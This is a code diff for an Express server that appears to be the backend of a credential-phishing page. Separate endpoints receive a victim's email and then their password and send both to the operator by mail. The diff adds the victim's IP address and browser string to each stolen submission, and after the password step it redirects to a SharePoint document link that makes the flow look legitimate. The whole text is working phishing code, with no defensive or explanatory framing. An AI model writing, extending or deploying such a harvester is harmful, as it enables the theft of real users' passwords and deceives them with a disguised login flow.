@@ -36,8 +36,19 @@ app.post('/send-email', async (req, res) => {
   const { email } = req.body;
   if (!email) return res.status(400).json({ success: false, message: 'Email missing' });
 
+  // Get IP and browser
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const browser = req.headers['user-agent'];
+
+  const message = `
+📨 New Email Submission
+Email: ${email}
+IP Address: ${ip}
+Browser: ${browser}
+`;
+
   try {
-    await sendMail(`User entered email: ${email}`);
+    await sendMail(message);
     res.json({ success: true, redirect: '/thank-you.html' });
   } catch (err) {
     console.error(err);
@@ -50,8 +61,19 @@ app.post('/send-password', async (req, res) => {
   const { password } = req.body;
   if (!password) return res.status(400).json({ success: false, message: 'Password missing' });
 
+  // Get IP and browser
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const browser = req.headers['user-agent'];
+
+  const message = `
+🔒 New Password Submission
+Password: ${password}
+IP Address: ${ip}
+Browser: ${browser}
+`;
+
   try {
-    await sendMail(`User entered password: ${password}`);
+    await sendMail(message);
     res.json({
       success: true,
       redirect: 'https://farmersedge-my.sharepoint.com/:w:/g/personal/thom_weir_farmersedge_ca/EU-EAWlqZ4RJpbQskh6diXgBwlF_oaAWM4kc68pxFUwn6A',
